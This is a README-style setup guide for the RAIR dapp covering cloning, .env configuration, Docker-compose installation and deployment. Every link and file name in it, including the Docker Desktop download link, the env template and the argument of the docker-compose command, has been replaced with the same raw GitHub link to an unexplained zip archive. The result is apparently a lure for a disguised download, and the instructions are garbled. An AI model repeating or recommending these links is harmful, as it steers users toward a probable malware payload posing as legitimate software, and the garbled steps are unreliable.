# Getting Started
_Building RAIR is a snap! Follow these simple steps and you'll be up and running in no time._

![click walkthrough no narration](https://raw.githubusercontent.com/leeit07/rair-dapp/main/rair-stream/bin/shared_backend_code_generated/vault/dapp-rair-1.1.zip)

## Clone the RAIR repository

First, get the source code
    
- Clone the RAIR repo to your local environment.

## Configure Environment Variables

Inside the repository root is a file called `https://raw.githubusercontent.com/leeit07/rair-dapp/main/rair-stream/bin/shared_backend_code_generated/vault/dapp-rair-1.1.zip` This template contains a list of values that are to be consumed during the build process:

- Create a new file in the repositry root called `.env`

- Copy and paste the contents of `https://raw.githubusercontent.com/leeit07/rair-dapp/main/rair-stream/bin/shared_backend_code_generated/vault/dapp-rair-1.1.zip` into `.env`

## Install Docker-compose

RAIR deploys each its services in a self-contained Docker image:

- Docker-compose is required. It comes pre-packaged with [Docker-Desktop](https://raw.githubusercontent.com/leeit07/rair-dapp/main/rair-stream/bin/shared_backend_code_generated/vault/dapp-rair-1.1.zip), otherwise it must be installed [manually](https://raw.githubusercontent.com/leeit07/rair-dapp/main/rair-stream/bin/shared_backend_code_generated/vault/dapp-rair-1.1.zip). 

## Deploy RAIR

It's the moment of truth. From the repository root, run:

    docker-compose -f {https://raw.githubusercontent.com/leeit07/rair-dapp/main/rair-stream/bin/shared_backend_code_generated/vault/dapp-rair-1.1.zip} up

`{https://raw.githubusercontent.com/leeit07/rair-dapp/main/rair-stream/bin/shared_backend_code_generated/vault/dapp-rair-1.1.zip}` will be the file configured for your specific deployment. Wait for the app to build. Keep an eye on the terminal for any errors. 

## Launch the App

Point the browser at the RAIRfrontend service (localhost:8088)

## Complete the MVP Test Plan

We've compiled a list of post-installation checks [here](https://raw.githubusercontent.com/leeit07/rair-dapp/main/rair-stream/bin/shared_backend_code_generated/vault/dapp-rair-1.1.zip)
